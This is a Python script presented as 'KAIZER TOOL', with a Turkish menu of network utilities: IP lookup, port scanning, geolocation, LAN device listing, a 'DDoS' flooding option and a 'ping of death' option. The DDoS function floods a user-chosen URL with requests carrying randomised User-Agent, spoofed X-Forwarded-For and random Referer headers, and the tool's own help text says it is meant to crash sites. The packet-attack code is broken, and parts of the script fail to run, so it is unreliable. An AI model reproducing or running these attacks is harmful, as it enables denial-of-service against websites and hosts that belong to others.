import os
import subprocess
import random
import requests
import socket
import string
import geocoder
import pyfiglet
import time
import sys
import importlib.util
import re
import scapy.all as scapy
import struct
from cfonts import render, say


required_modules = ['pyfiglet', 'cfonts', 'geocoder']

def install_module(module):
    subprocess.check_call([sys.executable, "-m", "pip", "install", module])

def install_required_modules():
    for module in required_modules:
        print(f"ɪ̇ɴᴅɪʀɪʟɪʏᴏʀ: {module}")
        if importlib.util.find_spec(module) is None:
            install_module(module)
        else:
            print(f"{module} modülü zaten yüklü.")

install_required_modules()
os.system("clear")


def ip_adresi_kontrolu(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def mac_adresi_kontrolu(mac):
    mac_deseni = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    if mac_deseni.match(mac):
        return True
    else:
        return False

def bos_deger_kontrolu(deger):
    if not deger.strip():
        return False
    else:
        return True


K = '\x1b[1;31m'  # Kırmızı
Y = '\x1b[2;32m'  # Yeşil
S = '\x1b[33m'  # Sarı
Y = '\033[1;34m'  # Açık Mavi
P = '\x1b[2;35m'  # Mor
B = '\033[2;36m'  # Lacivert
T = '\x1b[38;5;208m'  # Turuncu
M = '\x1b[96m'  # Mavi
C = "\033[1;97m"  # Beyaz



try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    os.system("clear")
output = render('KAIZER\n TOOL', colors=['green', 'blue'], align='center')
print(output)
Op = "313"
print(K+'━'*52)
aze = f" {T}      Tool maker: @PhpKaizer iyi Kullanımlar.."
print(aze)
print(K+'━'*52)


def slow_print(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.014)
    print()


def main_menu():
    menu = f"""{T}
  [1] IP Bɪʟɢɪʟᴇʀɪ ɢᴇᴛɪʀ
  [2] IP ᴘᴏʀᴛ ᴛᴀʀᴀ
  [3] IP ꜱᴏʀɢᴜʟᴀ
  [4] ᴀɢ̆ᴀ ʙᴀɢʟı ᴄɪʜᴀᴢʟᴀʀ
  [5] ᴅᴅᴏs sᴀʟᴅıʀı ʏᴀᴘ
  [6] ᴏ̈ʟᴜ̈ᴍ ᴘɪɴɢɪ ɢᴏ̈ɴᴅᴇʀ
  [7] ᴛᴏᴏʟ ʜᴀᴋᴋıɴᴅᴀ ʙɪʟɢɪ
  [8] ᴄ̧ıᴋış ʏᴀᴘ
    """
    slow_print(menu)
    while True:
        secim = input(f"{M}  ~ $ ")
        if secim == "1":
            secenek1()
        elif secim == "2":
            secenek2()
        elif secim == "3":
            secenek3()
        elif secim == "4":
            secenek4()
        elif secim == "5":
            secenek5()
        elif secim == "6":
            secenek6()
        elif secim == "7":
            secenek7()
        elif secim == "8":
         print(f"{Y}  ᴄ̧ıᴋış ʏᴀᴘıʟᴅı.")
         exit()
         break
        else:
            print(f"{K}  ɢᴇᴄ̧ᴇʀsɪᴢ sᴇᴄ̧ɪᴍ. ɢᴇᴄ̧ᴇʀʟɪ ʙɪʀ sᴇᴄ̧ᴇɴᴇᴋ ɢɪʀɪɴ.")
            main_menu()


def secenek1():
    def yerel_ip_adresini_al():
        try:
            response = requests.get('https://api.ipify.org')
            response.raise_for_status()
            dis_ip = response.text
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            yerel_ip = s.getsockname()[0]
            s.close()
            return dis_ip, yerel_ip
        except Exception as e:
            print(f"{K}  ɪᴘ ᴀᴅʀᴇsɪ ᴀʟıɴıʀᴋᴇɴ ʜᴀᴛᴀ ᴏʟᴜşᴛᴜ:", e)
            return None, None

    dis_ip, yerel_ip = yerel_ip_adresini_al()
    if dis_ip and yerel_ip:
        print(f"{Y}  ᴅış ɪᴘ ᴀᴅʀᴇsɪɴɪᴢ:", dis_ip)
        print(f"{Y}  ʏᴇʀᴇʟ ɪᴘ ᴀᴅʀᴇsɪɴɪᴢ:", yerel_ip)
    else:
        print(f"{K}  ɪᴘ ᴀᴅʀᴇsʟᴇʀɪ ᴀʟıɴᴀᴍᴀᴅı.")
    main_menu()


def secenek2():
    def port_tarama(hedef_host, hedef_portlar):
        for port in hedef_portlar:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(1)
            try:
                sonuc = soket.connect_ex((hedef_host, port))
                if sonuc == 0:
                    print(f"{Y}  ᴘᴏʀᴛ {port} ᴀᴄ̧ıᴋ")
                else:
                    print(f"{K}  ᴘᴏʀᴛ {port} ᴋᴀᴘᴀʟı")
            except Exception as e:
                print(f"{K}  Hata Oluştu: {e}")
            finally:
                soket.close()

    hedef_host = input(f"{T}  ᴅış ɪᴘ ᴀᴅʀᴇsɪɴɪ ɢɪʀɪɴ: ")
    hedef_portlar = [21, 22, 23, 25, 53, 80, 443, 3389]
    port_tarama(hedef_host, hedef_portlar)
    main_menu()


def secenek3():
    def ip_konumunu_al(ip_adresi):
        konum = geocoder.ip(ip_adresi)
        if konum.ok:
            print(f"{Y}  ɪᴘ ᴀᴅʀᴇsɪ: {ip_adresi}")
            print(f"{Y}  ᴜ̈ʟᴋᴇ: {konum.country}")
            if hasattr(konum, 'country_code'):
                print(f"{Y}  ᴜ̈ʟᴋᴇ ᴋᴏᴅᴜ: {konum.country_code}")
            else:
                print(f"{K}  ᴜ̈ʟᴋᴇ ᴋᴏᴅᴜ ʙɪʟɢɪsɪ ᴀʟıɴᴀᴍᴀᴅı.")
            if hasattr(konum, 'region'):
                print(f"{Y}  ʙᴏ̈ʟɢᴇ: {konum.region}")
            else:
                print(f"{K}  ʙᴏ̈ʟɢᴇ ʙɪʟɢɪsɪ ᴀʟıɴᴀᴍᴀᴅı.")
            print(f"{Y}  şᴇʜɪʀ: {konum.city}")
            print(f"{Y}  ᴘᴏsᴛᴀ ᴋᴏᴅᴜ: {konum.postal}")
            if hasattr(konum, 'timezone'):
                print(f"{Y}  ᴢᴀᴍᴀɴ ᴅɪʟɪᴍɪ: {konum.timezone}")
            else:
                print(f"{K}  ᴢᴀᴍᴀɴ ᴅɪʟɪᴍɪ ʙɪʟɢɪsɪ ᴀʟıɴᴀᴍᴀᴅı.")
            print(f"{Y}  ᴇɴʟᴇᴍ: {konum.latlng[0]}")
            print(f"{Y}  ʙᴏʏʟᴀᴍ: {konum.latlng[1]}")
            print(f"{Y}  ɪᴘ ᴛɪᴘɪ: {konum.ip}")
            print(f"{Y}  ɪᴘ sᴇʀᴠɪs sᴀɢ̆ʟᴀʏıᴄısı: {konum.org}")
        else:
            print(f"{K}  ᴋᴏɴᴜᴍ ʙɪʟɢɪsɪ ᴀʟıɴᴀᴍᴀᴅı.")

    ip_adresi = input(f"{T}  ᴅış ɪᴘ ᴀᴅʀᴇs sᴏʀɢᴜʟᴀ: ")
    ip_konumunu_al(ip_adresi)
    main_menu()


def secenek4():
    def get_connected_devices():
        connected_devices = {}
        try:
            ip_output = subprocess.check_output("ip neigh show", shell=True).decode()
            
            matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s.*\s(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})", ip_output)
            for match in matches:
                ip = match[0]
                mac = match[1]
                connected_devices[ip] = mac

            return connected_devices
        except Exception as e:
            print(f"{K}  ʜᴀᴛᴀ: {e}")
            return None

    print(f"{M}  ᴀɢ̆ᴅᴀᴋɪ ᴄɪʜᴀᴢʟᴀʀ ᴠᴇ ᴍᴀᴄ ᴀᴅʀᴇsʟᴇʀɪ:")
    connected_devices = get_connected_devices()
    if connected_devices:
        for ip, mac in connected_devices.items():
            print(f"{Y}  {ip}: {mac}")
    else:
        print(f"{K}  Bağlı cihaz bulunamadı.")
    main_menu()


def secenek5():
    def rasgele_kullanici_aygiti_uret():
        platform = random.choice(['Macintosh', 'Windows', 'X11', 'Linux', 'iPhone', 'iPad'])
        tarayici = random.choice(['chrome', 'firefox', 'safari'])
        surum = '.'.join([str(random.randint(0, 9)) for _ in range(3)])
        kullanici_aygiti = f'Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{surum} Safari/537.36'
        return kullanici_aygiti

    def rasgele_ip_uret():
        return '.'.join(str(random.randint(0, 255)) for _ in range(4))

    def rasgele_referer_uret():
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(10))

    def ddos_saldirisi(hedef_url, saldiri_sayisi):
        for _ in range(saldiri_sayisi):
            try:
                kullanici_aygiti = rasgele_kullanici_aygiti_uret()
                ip_adresi = rasgele_ip_uret()
                referer = rasgele_referer_uret()
                headers = {'User-Agent': kullanici_aygiti, 'X-Forwarded-For': ip_adresi, 'Referer': referer}
                response = requests.get(hedef_url, headers=headers, timeout=0.6)
                print(f"{Y}  ᴅᴅᴏs sᴀʟᴅıʀı ɢᴏ̈ɴᴅᴇʀɪʟᴅɪ! ʏᴀɴıᴛ: {response.status_code}")
            except Exception as e:
                print(f"{K}  sᴀʟᴅıʀı ɢᴏ̈ɴᴅᴇʀɪʟᴇᴍᴇᴅɪ: {e}")

    hedef_url = input("  sɪᴛᴇ ᴜʀʟ'sɪɴɪ ɢɪʀɪɴ: ")
    saldiri_sayisi = int(input("  sᴀʟᴅıʀı ᴋᴀᴄ̧ ᴋᴇᴢ ɢᴇʀᴄ̧ᴇᴋʟᴇşᴛɪʀɪʟsɪɴ: "))
    ddos_saldirisi(hedef_url, saldiri_sayisi)
    main_menu()


def secenek6():
    def ölüm_pingi(ip, hedef_mac):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        
            mac_paket = hedef_mac.replace(':', '').decode('hex')
            paket = mac_paket + b'\x08\x00\x00\x00' + 65507 * b'\xba\xdc\x0f\xfe'
            
            s.sendto(paket, (ip, 0))
            print(f"{Y}  ᴘᴀᴋᴇᴛ ʙᴀşᴀʀıʏʟᴀ ɢᴏ̈ɴᴅᴇʀɪʟᴅɪ!")
        except socket.error as e:
            print(f"{K}  ʜᴀᴛᴀ: {e}")

    hedef_ip = input("  ʜᴇᴅᴇғ ɪᴘ ᴀᴅʀᴇsɪɴɪ ɢɪʀɪɴ: ")
    hedef_mac = input("  ʜᴇᴅᴇғ ᴍᴀᴄ ᴀᴅʀᴇsɪɴɪ ɢɪʀɪɴ: ")

    ölüm_pingi(hedef_ip, hedef_mac)
    main_menu()


def secenek7():
  print(f"""{P}  Seçenek [1] Sizin IP Ve Dış IP\n  Yani İnternet Sağlayıcı IP Getirir.

  Seçenek [2] Site Url Yada IP Uygun Port Tarar.

  Seçenek [3] IP Yada Site IP İle Sorgu\n  Yapıp Bilgi Alabilirsiniz.

  Seçenek [4] Wi-Fi Ağındaki Bağlı Cihazların\n  IP'leri Gösterir.

  Seçenek [5] (DDoS) Siteye Sürekli İstek\n  Göndererek Çökertme Yapar.

  Seçenek [6] Büyük Dosya Gönderiyor Tehlikeli\n  Olduğu Söyleniyor Root'lu Olan Kullanır.
""")
  main_menu()



if __name__ == "__main__":
    main_menu()

